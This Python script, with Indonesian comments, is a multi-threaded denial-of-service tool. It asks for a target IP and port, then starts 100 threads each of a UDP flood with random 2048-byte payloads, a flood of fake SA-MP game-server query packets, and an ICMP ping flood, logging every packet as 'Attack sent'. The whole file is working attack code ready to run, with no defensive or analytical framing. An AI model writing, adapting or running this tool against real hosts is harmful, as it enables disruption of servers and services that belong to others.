import socket
import threading
import random
import os
import platform
import datetime

target_ip = input("IP Target: ")
target_port = int(input("Port Target: "))
total_threads = 100

# ===== Waktu Debug Format ==========================================================
def get_time():
    return datetime.datetime.now().strftime("%H:%M:%S")

# ===== 1. UDP FLOOD =================================================================
def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    thread_id = threading.get_ident()
    bytes_data = random._urandom(2048)
    while True:
        try:
            sock.sendto(bytes_data, (target_ip, target_port))
            print(f"Attack sent: {target_ip}:{target_port} | Thread-{thread_id} | {get_time()} | ✅ Success [UDP]")
        except:
            print(f"Attack sent: {target_ip}:{target_port} | Thread-{thread_id} | {get_time()} | ❌ Failed [UDP]")

# ===== 2. FAKE SAMP PACKET FLOOD ===================================================
def samp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    thread_id = threading.get_ident()
    while True:
        try:
            packet = b'SAMP' + bytes([127, 0, 0, 1]) + target_port.to_bytes(2, 'little') + b'p0101'
            sock.sendto(packet, (target_ip, target_port))
            print(f"Attack sent: {target_ip}:{target_port} | Thread-{thread_id} | {get_time()} | ✅ Success [SAMP]")
        except:
            print(f"Attack sent: {target_ip}:{target_port} | Thread-{thread_id} | {get_time()} | ❌ Failed [SAMP]")

# ===== 3. ICMP PING FLOOD ==========================================================
def icmp_flood():
    thread_id = threading.get_ident()
    cmd = ""
    if platform.system().lower() == "windows":
        cmd = f"ping -n 1 {target_ip} >nul"
    else:
        cmd = f"ping -c 1 {target_ip} >/dev/null"

    while True:
        result = os.system(cmd)
        if result == 0:
            print(f"Attack sent: {target_ip} | Thread-{thread_id} | {get_time()} | ✅ Success [ICMP]")
        else:
            print(f"Attack sent: {target_ip} | Thread-{thread_id} | {get_time()} | ❌ Failed [ICMP]")

# ===== LAUNCH ALL THREADS ==========================================================
print(f"[INFO] Menyerang {target_ip}:{target_port} dengan {total_threads} thread per jenis serangan...\n")

for _ in range(total_threads):
    threading.Thread(target=udp_flood, daemon=True).start()
    threading.Thread(target=samp_flood, daemon=True).start()
    threading.Thread(target=icmp_flood, daemon=True).start()

# Keep main thread alive
while True:
    pass
